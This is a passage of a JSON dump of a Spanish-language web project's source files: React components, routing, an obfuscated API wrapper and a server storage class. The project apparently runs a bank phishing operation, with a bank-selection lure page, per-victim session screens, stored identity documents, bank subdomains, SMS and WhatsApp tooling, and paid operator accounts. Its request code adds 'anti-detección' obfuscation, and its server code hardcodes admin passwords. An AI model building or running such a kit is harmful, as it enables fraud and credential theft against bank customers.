text-white flex items-center justify-center\"\n                      >\n                        <Copy className=\"h-4 w-4 mr-2\" />\n                        Copiar\n                      </Button>\n                    </div>\n                  </div>\n                )}\n              </div>\n              \n              <div className=\"col-span-2 flex flex-col items-center justify-center bg-[#2a2a2a] rounded-lg p-4\">\n                {qrImageUrl ? (\n                  <>\n                    <img \n                      src={qrImageUrl} \n                      alt=\"C贸digo QR generado\" \n                      className=\"max-w-full max-h-60 md:max-h-80\"\n                    />\n                    <div className=\"mt-4 text-center\">\n                      <span className=\"text-sm text-gray-400\">\n                        C贸digo: <span className=\"font-mono\">{inputText}</span>\n                      </span>\n                    </div>\n                  </>\n                ) : (\n                  <div className=\"text-center text-gray-500 py-16\">\n                    <QrCode className=\"h-16 w-16 mx-auto mb-4 opacity-50\" />\n                    <p>Ingresa un c贸digo alfanum茅rico y presiona \"Generar QR\" para crear un c贸digo QR.</p>\n                  </div>\n                )}\n              </div>\n            </div>\n          </div>\n        </CardContent>\n      </Card>\n    </div>\n  );\n}","size_bytes":7378},"client/src/components/ui/sheet.tsx":{"content":"import * as React from \"react\"\nimport * as SheetPrimitive from \"@radix-ui/react-dialog\"\nimport { cva, type VariantProps } from \"class-variance-authority\"\nimport { X } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Sheet = SheetPrimitive.Root\n\nconst SheetTrigger = SheetPrimitive.Trigger\n\nconst SheetClose = SheetPrimitive.Close\n\nconst SheetPortal = SheetPrimitive.Portal\n\nconst SheetOverlay = React.forwardRef<\n  React.ElementRef<typeof SheetPrimitive.Overlay>,\n  React.ComponentPropsWithoutRef<typeof SheetPrimitive.Overlay>\n>(({ className, ...props }, ref) => (\n  <SheetPrimitive.Overlay\n    className={cn(\n      \"fixed inset-0 z-50 bg-black/80  data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0\",\n      className\n    )}\n    {...props}\n    ref={ref}\n  />\n))\nSheetOverlay.displayName = SheetPrimitive.Overlay.displayName\n\nconst sheetVariants = cva(\n  \"fixed z-50 gap-4 bg-background p-6 shadow-lg transition ease-in-out data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:duration-300 data-[state=open]:duration-500\",\n  {\n    variants: {\n      side: {\n        top: \"inset-x-0 top-0 border-b data-[state=closed]:slide-out-to-top data-[state=open]:slide-in-from-top\",\n        bottom:\n          \"inset-x-0 bottom-0 border-t data-[state=closed]:slide-out-to-bottom data-[state=open]:slide-in-from-bottom\",\n        left: \"inset-y-0 left-0 h-full w-3/4 border-r data-[state=closed]:slide-out-to-left data-[state=open]:slide-in-from-left sm:max-w-sm\",\n        right:\n          \"inset-y-0 right-0 h-full w-3/4  border-l data-[state=closed]:slide-out-to-right data-[state=open]:slide-in-from-right sm:max-w-sm\",\n      },\n    },\n    defaultVariants: {\n      side: \"right\",\n    },\n  }\n)\n\ninterface SheetContentProps\n  extends React.ComponentPropsWithoutRef<typeof SheetPrimitive.Content>,\n    VariantProps<typeof sheetVariants> {}\n\nconst SheetContent = React.forwardRef<\n  React.ElementRef<typeof SheetPrimitive.Content>,\n  SheetContentProps\n>(({ side = \"right\", className, children, ...props }, ref) => (\n  <SheetPortal>\n    <SheetOverlay />\n    <SheetPrimitive.Content\n      ref={ref}\n      className={cn(sheetVariants({ side }), className)}\n      {...props}\n    >\n      {children}\n      <SheetPrimitive.Close className=\"absolute right-4 top-4 rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-secondary\">\n        <X className=\"h-4 w-4\" />\n        <span className=\"sr-only\">Close</span>\n      </SheetPrimitive.Close>\n    </SheetPrimitive.Content>\n  </SheetPortal>\n))\nSheetContent.displayName = SheetPrimitive.Content.displayName\n\nconst SheetHeader = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLDivElement>) => (\n  <div\n    className={cn(\n      \"flex flex-col space-y-2 text-center sm:text-left\",\n      className\n    )}\n    {...props}\n  />\n)\nSheetHeader.displayName = \"SheetHeader\"\n\nconst SheetFooter = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLDivElement>) => (\n  <div\n    className={cn(\n      \"flex flex-col-reverse sm:flex-row sm:justify-end sm:space-x-2\",\n      className\n    )}\n    {...props}\n  />\n)\nSheetFooter.displayName = \"SheetFooter\"\n\nconst SheetTitle = React.forwardRef<\n  React.ElementRef<typeof SheetPrimitive.Title>,\n  React.ComponentPropsWithoutRef<typeof SheetPrimitive.Title>\n>(({ className, ...props }, ref) => (\n  <SheetPrimitive.Title\n    ref={ref}\n    className={cn(\"text-lg font-semibold text-foreground\", className)}\n    {...props}\n  />\n))\nSheetTitle.displayName = SheetPrimitive.Title.displayName\n\nconst SheetDescription = React.forwardRef<\n  React.ElementRef<typeof SheetPrimitive.Description>,\n  React.ComponentPropsWithoutRef<typeof SheetPrimitive.Description>\n>(({ className, ...props }, ref) => (\n  <SheetPrimitive.Description\n    ref={ref}\n    className={cn(\"text-sm text-muted-foreground\", className)}\n    {...props}\n  />\n))\nSheetDescription.displayName = SheetPrimitive.Description.displayName\n\nexport {\n  Sheet,\n  SheetPortal,\n  SheetOverlay,\n  SheetTrigger,\n  SheetClose,\n  SheetContent,\n  SheetHeader,\n  SheetFooter,\n  SheetTitle,\n  SheetDescription,\n}\n","size_bytes":4267},"client/src/utils/api.ts":{"content":"// API utilities con ofuscaci贸n\nimport { getRandomHeaders, randomDelay, encodeStr } from './obfuscation';\n\n// Paths de API ofuscados\nconst API_PATHS = {\n  user: encodeStr('/api/user'),\n  sms: encodeStr('/api/sms'),\n  sessions: encodeStr('/api/sessions'),\n  keys: encodeStr('/api/keys'),\n  notifications: encodeStr('/api/notifications')\n};\n\nexport const getApiPath = (key: keyof typeof API_PATHS): string => {\n  return atob(API_PATHS[key].split('').reverse().join(''));\n};\n\n// Request wrapper con anti-detecci贸n\nexport const secureRequest = async (url: string, options: RequestInit = {}): Promise<Response> => {\n  // Delay aleatorio antes del request\n  await randomDelay(50, 150);\n  \n  const headers = {\n    ...getRandomHeaders(),\n    'Content-Type': 'application/json',\n    ...options.headers\n  };\n  \n  // Agregar noise headers aleatorios\n  const noiseHeaders = {\n    'X-Request-ID': Math.random().toString(36).substring(7),\n    'X-Client-Version': '2.1.3',\n    'X-Timestamp': Date.now().toString()\n  };\n  \n  return fetch(url, {\n    ...options,\n    headers: { ...headers, ...noiseHeaders }\n  });\n};\n\n// Wrapper para requests con retry y ofuscaci贸n\nexport const apiRequest = async (endpoint: string, options: RequestInit = {}, retries: number = 3): Promise<any> => {\n  for (let i = 0; i < retries; i++) {\n    try {\n      const response = await secureRequest(endpoint, options);\n      \n      if (!response.ok) {\n        if (i === retries - 1) {\n          throw new Error(`Request failed: ${response.status}`);\n        }\n        await randomDelay(1000, 2000);\n        continue;\n      }\n      \n      return await response.json();\n    } catch (error) {\n      if (i === retries - 1) {\n        throw error;\n      }\n      await randomDelay(1000, 2000);\n    }\n  }\n};","size_bytes":1760},"client/src/App.tsx":{"content":"import { Switch, Route } from \"wouter\";\nimport { queryClient } from \"./lib/queryClient\";\nimport { QueryClientProvider } from \"@tanstack/react-query\";\nimport { Toaster } from \"@/components/ui/toaster\";\nimport NotFound from \"@/pages/not-found\";\nimport AdminPanel from \"@/pages/AdminPanel\";\nimport ClientScreen from \"@/pages/ClientScreen\";\nimport AuthPage from \"@/pages/AuthPage\";\nimport BankSelectionPage from \"@/pages/BankSelectionPage\";\nimport QRGeneratorPage from \"@/pages/QRGeneratorPage\";\nimport TwoFactorVerification from \"@/pages/TwoFactorVerification\";\nimport UserPanel from \"@/pages/UserPanel\";\nimport { AuthProvider } from \"@/hooks/use-auth\";\nimport { ProtectedRoute } from \"@/components/ProtectedRoute\";\n\nfunction Router() {\n  return (\n    <Switch>\n      <Route path=\"/\" component={BankSelectionPage} />\n      <Route path=\"/Balonx\" component={AuthPage} />\n      <Route path=\"/auth\" component={AuthPage} />\n      <Route path=\"/2fa-verify\" component={TwoFactorVerification} />\n      <ProtectedRoute path=\"/admin\" component={AdminPanel} adminOnly={false} />\n      <ProtectedRoute path=\"/panel\" component={UserPanel} adminOnly={false} />\n      <ProtectedRoute path=\"/qr-generator\" component={QRGeneratorPage} adminOnly={false} />\n      <Route path=\"/client/:sessionId\" component={ClientScreen} />\n      <Route path=\"/:sessionId\" component={ClientScreen} />\n      <Route component={NotFound} />\n    </Switch>\n  );\n}\n\nfunction App() {\n  return (\n    <QueryClientProvider client={queryClient}>\n      <AuthProvider>\n        <Router />\n        <Toaster />\n      </AuthProvider>\n    </QueryClientProvider>\n  );\n}\n\nexport default App;\n","size_bytes":1633},"resetAdminPassword.js":{"content":"import bcrypt from 'bcrypt';\nimport { Pool } from '@neondatabase/serverless';\n\nasync function resetAdminPassword() {\n  // Configurar conexi贸n a la base de datos\n  const pool = new Pool({ connectionString: process.env.DATABASE_URL });\n  \n  try {\n    // Hash de la nueva contrase帽a\n    const newPassword = 'balonx';\n    const saltRounds = 10;\n    const hashedPassword = await bcrypt.hash(newPassword, saltRounds);\n    \n    // Actualizar la contrase帽a en la base de datos\n    const result = await pool.query(\n      'UPDATE users SET password = $1 WHERE username = $2',\n      [hashedPassword, 'balonx']\n    );\n    \n    if (result.rowCount > 0) {\n      console.log('Contrase帽a del administrador balonx actualizada exitosamente');\n      console.log('Nueva contrase帽a: balonx');\n    } else {\n      console.log('No se encontr贸 el usuario balonx');\n    }\n  } catch (error) {\n    console.error('Error al actualizar la contrase帽a:', error);\n  } finally {\n    await pool.end();\n  }\n}\n\nresetAdminPassword();","size_bytes":1001},"server/storage.ts":{"content":"import { \n  sessions, type Session, insertSessionSchema, User, AccessKey, Device, \n  UserRole, InsertUser, InsertAccessKey, InsertDevice, users, accessKeys, \n  devices, SmsConfig, InsertSmsConfig, SmsCredits, InsertSmsCredits, SmsHistory, InsertSmsHistory,\n  smsConfig, smsCredits, smsHistory, SiteConfig, InsertSiteConfig, siteConfig,\n  notifications, notificationPreferences, Notification, InsertNotification, \n  NotificationPrefs, InsertNotificationPrefs, NotificationType, NotificationPriority,\n  verificationCodes, VerificationCode, InsertVerificationCode, SmsRouteType,\n  systemConfig, SystemConfig, InsertSystemConfig, payments, Payment, InsertPayment, PaymentStatus,\n  discountCodes, DiscountCode, InsertDiscountCode,\n  executives, Executive, InsertExecutive,\n  officeProfiles, OfficeProfile, InsertOfficeProfile,\n  whatsappConfig, WhatsappConfig, InsertWhatsappConfig,\n  whatsappMenuOptions, WhatsappMenuOption, InsertWhatsappMenuOption,\n  whatsappConversations, WhatsappConversation, InsertWhatsappConversation,\n  bankSubdomains, BankSubdomain, InsertBankSubdomain,\n  bankScreenFlows, BankScreenFlow, InsertBankScreenFlow,\n  userBankFlows, UserBankFlow, InsertUserBankFlow,\n  linkTokens,\n  AccountType\n} from \"@shared/schema\";\nimport { z } from \"zod\";\nimport { nanoid } from \"nanoid\";\nimport bcrypt from \"bcrypt\";\nimport { db, pool } from './db';\nimport { eq, and, lt, isNull, desc, asc, gte, sql, or, ne, count, isNotNull, inArray } from 'drizzle-orm';\nimport session from 'express-session';\nimport connectPg from 'connect-pg-simple';\n\nconst PostgresSessionStore = connectPg(session);\n\n// Define storage interface\nexport interface IStorage {\n  // Sesiones\n  getAllSessions(): Promise<Session[]>;\n  getSavedSessions(userId?: number, isExecutive?: boolean): Promise<Session[]>;\n  getCurrentSessions(userId?: number, isExecutive?: boolean): Promise<Session[]>;\n  getSessionById(sessionId: string): Promise<Session | undefined>;\n  createSession(data: Partial<Session>): Promise<Session>;\n  updateSession(sessionId: string, data: Partial<Session>): Promise<Session>;\n  deleteSession(sessionId: string): Promise<boolean>;\n  getSessionsWithIdentityDocuments(userId?: number, isExecutive?: boolean): Promise<any[]>;\n  saveSession(sessionId: string): Promise<Session>;\n  cleanupExpiredSessions(): Promise<number>; // Devuelve la cantidad de sesiones eliminadas\n  updateSessionActivity(sessionId: string): Promise<void>; // Actualiza la 煤ltima actividad\n  markSessionHasUserData(sessionId: string): Promise<void>; // Marca que una sesi贸n tiene datos\n  updateSessionPhoneNumber(sessionId: string, phoneNumber: string): Promise<void>; // Actualiza el n煤mero de tel茅fono\n  \n  // Usuarios\n  createUser(data: InsertUser): Promise<User>;\n  getUserById(id: number): Promise<User | undefined>;\n  getUserByUsername(username: string): Promise<User | undefined>;\n  validateUser(username: string, password: string): Promise<User | undefined>;\n  updateUserLastLogin(id: number): Promise<User>;\n  updateUser(id: number, data: Partial<User>): Promise<User>;\n  getAllUsers(): Promise<User[]>;\n  toggleUserStatus(username: string): Promise<boolean>;\n  getUsersExpiringTomorrow(): Promise<User[]>;\n  getRecentlyExpiredUsers(): Promise<User[]>;\n  activateUserForOneDay(username: string): Promise<User>;\n  activateUserForSevenDays(username: string): Promise<User>;\n  incrementUserDeviceCount(username: string): Promise<number>;\n  decrementUserDeviceCount(username: string): Promise<User>;\n  cleanupExpiredUsers(): Promise<number>;\n  deleteUser(username: string): Promise<boolean>;\n  \n  // API de SMS\n  getSmsConfig(): Promise<SmsConfig | null>;\n  updateSmsConfig(data: InsertSmsConfig): Promise<SmsConfig>;\n  \n  // Configuraci贸n del sitio\n  getSiteConfig(): Promise<SiteConfig | null>;\n  updateSiteConfig(data: InsertSiteConfig): Promise<SiteConfig>;\n  \n  // Cr茅ditos de SMS\n  getUserSmsCredits(userId: number): Promise<number>;\n  addSmsCredits(userId: number, amount: number): Promise<SmsCredits>;\n  useSmsCredit(userId: number): Promise<boolean>;\n  \n  // Historial de SMS\n  addSmsToHistory(data: InsertSmsHistory): Promise<SmsHistory>;\n  getUserSmsHistory(userId: number): Promise<SmsHistory[]>;\n  updateSmsStatus(id: number, status: string, errorMessage?: string): Promise<SmsHistory>;\n  \n  // Keys de acceso\n  createAccessKey(data: InsertAccessKey): Promise<AccessKey>;\n  getAccessKeyById(id: number): Promise<AccessKey | undefined>;\n  getAccessKeyByKey(key: string): Promise<AccessKey | undefined>;\n  getAllAccessKeys(): Promise<AccessKey[]>;\n  getActiveAccessKeys(): Promise<AccessKey[]>;\n  updateAccessKey(id: number, data: Partial<AccessKey>): Promise<AccessKey>;\n  deleteAccessKey(id: number): Promise<boolean>;\n  \n  // Dispositivos\n  registerDevice(data: InsertDevice): Promise<Device>;\n  getDeviceByDeviceId(deviceId: string): Promise<Device | undefined>;\n  getDevicesByAccessKeyId(accessKeyId: number): Promise<Device[]>;\n  updateDevice(id: number, data: Partial<Device>): Promise<Device>;\n  deleteDevice(id: number): Promise<boolean>;\n  countActiveDevicesForKey(accessKeyId: number): Promise<number>;\n  \n  // Notificaciones\n  createNotification(data: InsertNotification): Promise<Notification>;\n  getUserNotifications(userId: number, limit?: number): Promise<Notification[]>;\n  getUnreadNotificationsCount(userId: number): Promise<number>;\n  markNotificationAsRead(id: number): Promise<Notification>;\n  markAllNotificationsAsRead(userId: number): Promise<number>; // Devuelve cantidad de notificaciones marcadas\n  deleteNotification(id: number): Promise<boolean>;\n  deleteAllUserNotifications(userId: number): Promise<number>; // Devuelve cantidad de notificaciones eliminadas\n  \n  // Preferencias de notificaciones\n  getNotificationPreferences(userId: number): Promise<NotificationPrefs | undefined>;\n  createNotificationPreferences(data: InsertNotificationPrefs): Promise<NotificationPrefs>;\n  updateNotificationPreferences(userId: number, data: Partial<NotificationPrefs>): Promise<NotificationPrefs>;\n  \n  // C贸digos de verificaci贸n 2FA\n  createVerificationCode(data: InsertVerificationCode): Promise<VerificationCode>;\n  getValidVerificationCode(userId: number, code: string): Promise<VerificationCode | undefined>;\n  markVerificationCodeAsUsed(id: number): Promise<VerificationCode>;\n  cleanupExpiredVerificationCodes(): Promise<number>;\n  \n  // Configuraci贸n del sistema\n  getSystemConfig(): Promise<SystemConfig | null>;\n  updateSystemConfig(data: Partial<InsertSystemConfig>): Promise<SystemConfig>;\n  \n  // Pagos\n  createPayment(data: InsertPayment): Promise<Payment>;\n  getPaymentById(id: number): Promise<Payment | undefined>;\n  getUserPayments(userId: number): Promise<Payment[]>;\n  getPendingPayments(): Promise<Payment[]>;\n  updatePayment(id: number, data: Partial<Payment>): Promise<Payment>;\n  markPaymentAsCompleted(id: number, bitsoTransactionId: string): Promise<Payment>;\n  incrementPaymentVerificationAttempts(id: number): Promise<void>;\n  updatePaymentStatus(id: number, status: PaymentStatus): Promise<void>;\n  \n  // C贸digos de descuento\n  createDiscountCode(data: InsertDiscountCode): Promise<DiscountCode>;\n  getDiscountCodeByCode(code: string): Promise<DiscountCode | undefined>;\n  markDiscountCodeAsUsed(id: number, userId: number): Promise<DiscountCode>;\n  claimDiscountCode(code: string, userId?: number | null): Promise<DiscountCode | null>; // Operaci贸n at贸mica para reclamar\n  getAllDiscountCodes(): Promise<DiscountCode[]>;\n  \n  // Perfiles de oficina\n  createOfficeProfile(data: InsertOfficeProfile): Promise<OfficeProfile>;\n  getOfficeProfileByUserId(userId: number): Promise<OfficeProfile | undefined>;\n  updateOfficeProfile(userId: number, data: Partial<OfficeProfile>): Promise<OfficeProfile>;\n  incrementExecutiveCount(userId: number): Promise<void>;\n  decrementExecutiveCount(userId: number): Promise<void>;\n  \n  // Ejecutivos\n  createExecutive(data: InsertExecutive): Promise<Executive>;\n  getExecutiveById(id: number): Promise<Executive | undefined>;\n  getExecutiveByUsername(username: string): Promise<Executive | undefined>;\n  getExecutivesByOfficeId(userId: number): Promise<Executive[]>;\n  validateExecutive(username: string, password: string): Promise<Executive | undefined>;\n  updateExecutive(id: number, data: Partial<Executive>): Promise<Executive>;\n  updateExecutiveOtp(id: number, otpCode: string): Promise<Executive>;\n  deleteExecutive(id: number): Promise<boolean>;\n  incrementExecutiveSession(id: number): Promise<void>;\n  decrementExecutiveSession(id: number): Promise<void>;\n  \n  // WhatsApp Bot\n  getWhatsAppConfig(userId: number): Promise<WhatsappConfig | undefined>;\n  createWhatsAppConfig(data: InsertWhatsappConfig): Promise<WhatsappConfig>;\n  updateWhatsAppConfig(userId: number, data: Partial<WhatsappConfig>): Promise<WhatsappConfig>;\n  getWhatsAppMenuOptions(userId: number): Promise<WhatsappMenuOption[]>;\n  createWhatsAppMenuOption(data: InsertWhatsappMenuOption): Promise<WhatsappMenuOption>;\n  updateWhatsAppMenuOption(id: number, data: Partial<WhatsappMenuOption>): Promise<WhatsappMenuOption>;\n  deleteWhatsAppMenuOption(id: number): Promise<boolean>;\n  saveWhatsAppConversation(data: InsertWhatsappConversation): Promise<WhatsappConversation>;\n  getWhatsAppConversations(userId: number, limit?: number): Promise<WhatsappConversation[]>;\n  \n  // Sistema de Links con Subdominios\n  getBankSubdomains(): Promise<BankSubdomain[]>;\n  upsertBankSubdomain(data: InsertBankSubdomain): Promise<BankSubdomain>;\n  getBankScreenFlow(bankCode: string): Promise<BankScreenFlow | undefined>;\n  upsertBankScreenFlow(data: InsertBankScreenFlow): Promise<BankScreenFlow>;\n  \n  // Flujos de usuario por banco\n  getUserBankFlow(userId: number, bankCode: string): Promise<UserBankFlow | undefined>;\n  getAllUserBankFlows(userId: number): Promise<UserBankFlow[]>;\n  saveUserBankFlow(data: InsertUserBankFlow): Promise<UserBankFlow>;\n  updateUserBankFlow(userId: number, bankCode: string, data: Partial<UserBankFlow>): Promise<UserBankFlow>;\n  deleteUserBankFlow(userId: number, bankCode: string): Promise<boolean>;\n  \n  // Propiedad de la sesi贸n\n  sessionStore: session.Store;\n}\n\n// Implementaci贸n con base de datos para persistencia\nexport class DatabaseStorage implements IStorage {\n  sessionStore: session.Store;\n  \n  constructor() {\n    this.sessionStore = new PostgresSessionStore({ \n      pool, \n      createTableIfMissing: true,\n      tableName: 'session'\n    });\n    \n    // Inicializar el administrador por defecto\n    this.initializeDefaultAdmin();\n  }\n  \n  private async initializeDefaultAdmin() {\n    try {\n      // Comprobar si ya existe balonx\n      const existingAdmin = await this.getUserByUsername(\"balonx\");\n      if (!existingAdmin) {\n        // Hashear la nueva contrase帽a Balon19@\n        const hashedPassword = await bcrypt.hash('Balon19@', 10);\n        \n        // Crear el administrador principal por defecto si no existe\n        const admin = await this.createUser({\n          username: 'balonx',\n          password: hashedPassword,\n          role: UserRole.ADMIN\n        });\n        console.log('Usuario administrador por defecto creado: balonx');\n      } else {\n        // Actualizar la contrase帽a del administrador existente a Balon19@\n        const hashedPassword = await bcrypt.hash('Balon19@', 10);\n        await this.updateUser(existingAdmin.id, { password: hashedPassword });\n        console.log('Contrase帽a del administrador balonx actualizada');\n      }\n      \n      // Comprobar si ya existe el administrador yako\n      const existingYako = await this.getUserByUsername(\"yako\");\n      if (!existingYako) {\n        // Hashear la contrase帽a 'cruz azul'\n        const hashedPassword = await bcrypt.hash('cruz azul', 10);\n        \n        // Crear el administrador secundario\n        const admin = await this.createUser({\n          username: 'yako',\n          password: hashedPassword,\n          role: UserRole.ADMIN\n        });\n        console.log('Usuario administrador adicional creado: yako');\n      }\n    } catch (error) {\n      console.error('Error al crear/actualizar usuarios administradores:', error);\n    }\n  }\n  \n  // === M茅todos de usuario ===\n  async createUser(data: InsertUser): Promise<User> {\n    // Verificar si ya existe un usuario con ese nombre\n    const existingUser = await this.getUserByUsername(data.username);\n    if (existingUser) {\n      throw new Error(`El usuario ${data.username} ya existe`);\n    }\n    \n    // Preparar los datos del usuario usando los nombres de campo de Drizzle\n    const userData: any = {\n      username: data.username,\n      password: data.password, // La contrase帽a ya viene hasheada de auth.ts\n      role: data.role || UserRole.USER,\n      isActive: data.role === UserRole.ADMIN ? true : false, // Los usuarios normales inician inactivos\n      deviceCount: 0,\n      maxDevices: 3,\n      allowedBanks: data.allowedBanks || 'all',\n      telegramChatId: data.telegramChatId || null,\n      customPrice: data.customPrice || null,\n      accountType: data.accountType || 'individual',\n      createdAt: new Date()\n    };\n    \n    // Insertar en la base de datos\n    const [user] = await db.insert(users).values(userData).returning();\n    \n    console.log(`[Storage] Usuario creado: ${data.username} (rol: ${data.role || UserRole.USER})`);\n    console.log(`[Storage] Chat ID recibido: ${data.telegramChatId}`);\n    console.log(`[Storage] Datos a insertar:`, userData);\n    return user;\n  }\n  \n  async getUserById(id: number): Promise<User | undefined> {\n    const [user] = await db.select().from(users).where(eq(users.id, id));\n    return user;\n  }\n  \n  async getUserByUsername(username: string): Promise<User | undefined> {\n    const [user] = await db.select().from(users).where(eq(users.username, username));\n    return user;\n  }\n  \n  async validateUser(username: string, password: string): Promise<User | undefined> {\n    const user = await this.getUserByUsername(username);\n    \n    if (!user) {\n      console.log(`[Storage] Usuario no encontrado: ${username}`);\n      return undefined;\n    }\n    \n    // Si es un usuario admin, no verificar si est谩 activo\n    if (user.role !== UserRole.ADMIN && !user.isActive) {\n      console.log(`[Storage] Usuario ${username} inactivo, no puede iniciar sesi贸n`);\n      return undefined;\n    }\n    \n    const isValid = await bcrypt.compare(password, user.password);\n    \n    if (isValid) {\n      console.log(`[Storage] Login v谩lido para ${username}`);\n      return user;\n    }\n    \n    console.log(`[Storage] Contrase帽a inv谩lida para ${username}`);\n    return undefined;\n  }\n  \n  async updateUserLastLogin(id: number): Promise<User> {\n    const user = await this.getUserById(id);\n    \n    if (!user) {\n      throw new Error(`Usuario con ID ${id} no encontrado`);\n    }\n    \n    // Actualizar en la base de datos\n    const [updatedUser] = await db\n      .update(users)\n      .set({ lastLogin: new Date() })\n      .where(eq(users.id, id))\n      .returning();\n    \n    console.log(`[Storage] Actualizado 煤ltimo login para usuario ${user.username}`);\n    return updatedUser;\n  }\n  \n  async updateUser(id: number, data: Partial<User>): Promise<User> {\n    const user = await this.getUserById(id);\n    \n    if (!user) {\n      throw new Error(`Usuario con ID ${id} no encontrado`);\n    }\n    \n    // Procesamiento especial para allowedBanks para asegurar consistencia\n    if (data.allowedBanks !== undefined) {\n      // Normalizar el valor para 'all'\n      if (typeof data.allowedBanks === 'string' && data.allowedBanks.toLowerCase() === 'all') {\n        data.allowedBanks = 'all';\n        console.log(`[Storage] Normalizando allowedBanks a 'all' para usuario ${user.username}`);\n      }\n      \n      console.log(`[Storage] Actualizando bancos permitidos para ${user.username}: ${data.allowedBanks}`);\n    }\n    \n    // Actualizar en la base de datos\n    const [updatedUser] = await db\n      .update(users)\n      .set(data)\n      .where(eq(users.id, id))\n      .returning();\n    \n    return updatedUser;\n  }\n  \n  // M茅todos adicionales para administraci贸n de usuarios\n  async createAdminUser(username: string, password: string): Promise<User> {\n    return this.createUser({\n      username,\n      password,\n      role: UserRole.ADMIN\n    });\n  }\n  \n  async validateAdminUser(username: string, password: string): Promise<User | undefined> {\n    const user = await this.validateUser(username, password);\n    if (user && user.role === UserRole.ADMIN) {\n      return user;\n    }\n    return undefined;\n  }\n  \n  async toggleAdminUserStatus(username: string): Promise<boolean> {\n    const user = await this.getUserByUsername(username);\n    if (!user) {\n      return false;\n    }\n    \n    // Actualizar en la base de datos\n    const [updatedUser] = await db\n      .update(users)\n      .set({ isActive: !user.isActive })\n      .where(eq(users.username, username))\n      .returning();\n    \n    return true;\n  }\n  \n  async toggleUserStatus(username: string): Promise<boolean> {\n    const user = await this.getUserByUsername(username);\n    if (!user) {\n      return false;\n    }\n    \n    // Actualizar en la base de datos\n    const [updatedUser] = await db\n      .update(users)\n      .set({ isActive: !user.isActive })\n      .where(eq(users.username, username))\n      .returning();\n    \n    return true;\n  }\n  \n  // Activar un usuario por 1 d铆a\n  async activateUserForOneDay(username: string, allowedBanks?: string): Promise<User> {\n    const user = await this.getUserByUsername(username);\n    if (!user) {\n      throw new Error(`Usuario ${username} no encontrado`);\n    }\n    \n    // Establecer fecha de expiraci贸n (1 d铆a)\n    const expiresAt = new Date();\n    expiresAt.setDate(expiresAt.getDate() + 1);\n    \n    // IMPORTANTE: Si se proporciona un valor espec铆fico de allowedBanks, usarlo;\n    // de lo contrario, preservar el valor actual o usar 'all' como valor por defecto\n    const banksValue = allowedBanks !== undefined ? \n      allowedBanks : \n      (user.allowedBanks || 'all');\n    \n    // Actualizar en la base de datos\n    const [updatedUser] = await db\n      .update(users)\n      .set({\n        isActive: true,\n        expiresAt,\n        deviceCount: 0, // Reiniciar conteo de dispositivos\n        allowedBanks: banksValue\n      })\n      .where(eq(users.username, username))\n      .returning();\n    \n    console.log(`[Storage] Activando usuario ${username} por 1 d铆a, bancos permitidos: ${updatedUser.allowedBanks}`);\n    \n    // Enviar notificaci贸n por Telegram si tiene Chat ID\n    if (updatedUser.telegramChatId) {\n      try {\n        const { sendAccountActivationNotification, sendRenewalConfirmation } = await import('./telegramBot.js');\n        \n        // Si el usuario ya estaba activo antes, es una renovaci贸n\n        if (user.isActive) {\n          await sendRenewalConfirmation(updatedUser.id, updatedUser.expiresAt!);\n        } else {\n          // Si no estaba activo, es una activaci贸n inicial\n          await sendAccountActivationNotification({\n            username: updatedUser.username,\n            telegramChatId: updatedUser.telegramChatId,\n            expiresAt: updatedUser.expiresAt,\n            allowedBanks: updatedUser.allowedBanks\n          });\n        }\n      } catch (error) {\n        console.error(`[Storage] Error enviando notificaci贸n a ${username}:`, error);\n      }\n    }\n    \n    return updatedUser;\n  }\n  \n  // Activar un usuario por 7 d铆as\n  async activateUserForSevenDays(username: string, allowedBanks?: string): Promise<User> {\n    const user = await this.getUserByUsername(username);\n    if (!user) {\n      throw new Error(`Usuario ${username} no encontrado`);\n    }\n    \n    // Establecer fecha de expiraci贸n (7 d铆as)\n    const expiresAt = new Date();\n    expiresAt.setDate(expiresAt.getDate() + 7);\n    \n    // IMPORTANTE: Si se proporciona un valor espec铆fico de allowedBanks, usarlo;\n    // de lo contrario, preservar el valor actual o usar 'all' como valor por defecto\n    const banksValue = allowedBanks !== undefined ? \n      allowedBanks : \n      (user.allowedBanks || 'all');\n    \n    // Actualizar en la base de datos\n    const [updatedUser] = await db\n      .update(users)\n      .set({\n        isActive: true,\n        expiresAt,\n        deviceCount: 0, // Reiniciar conteo de dispositivos\n        allowedBanks: banksValue\n      })\n      .where(eq(users.username, username))\n      .returning();\n    \n    console.log(`[Storage] Activando usuario ${username} por 7 d铆as, bancos permitidos: ${updatedUser.allowedBanks}`);\n    \n    // Enviar notificaci贸n por Telegram si tiene Chat ID\n    if (updatedUser.telegramChatId) {\n      try {\n        const { sendAccountActivationNotification, sendRenewalConfirmation } = await import('./telegramBot.js');\n        \n        // Si el usuario ya estaba activo antes, es una renovaci贸n\n        if (user.isActive) {\n          await sendRenewalConfirmation(updatedUser.id, updatedUser.expiresAt!);\n        } else {\n          // Si no estaba activo, es una activaci贸n inicial\n          await sendAccountActivationNotification({\n            username: updatedUser.username,\n            telegramChatId: updatedUser.telegramChatId,\n            expiresAt: updatedUser.expiresAt,\n            allowedBanks: updatedUser.allowedBanks\n          });\n        }\n      } catch (error) {\n        console.error(`[Storage] Error enviando notificaci贸n a ${username}:`, error);\n      }\n    }\n    \n    return updatedUser;\n  }\n  \n  // Incrementar el conteo de dispositivos para un usuario (sin l铆mite)\n  async incrementUserDeviceCount(username: string): Promise<number> {\n    const user = await this.getUserByUsername(username);\n    if (!user) {\n      throw new Error(`Usuario ${username} no encontrado`);\n    }\n    \n    const deviceCount = user.deviceCount || 0;\n    \n    // Incrementar el contador de dispositivos (sin verificaci贸n de l铆mite)\n    const newDeviceCount = deviceCount + 1;\n    \n    // Actualizar en la base de datos\n    const [updatedUser] = await db\n      .update(users)\n      .set({ deviceCount: newDeviceCount })\n      .where(eq(users.username, username))\n      .returning();\n    \n    return newDeviceCount;\n  }\n  \n  // Decrementar el conteo de dispositivos para un usuario\n  async decrementUserDeviceCount(username: string): Promise<User> {\n    const user = await this.getUserByUsername(username);\n    if (!user) {\n      throw new Error(`Usuario ${username} no encontrado`);\n    }\n    \n    // No decrementar por debajo de 0\n    const 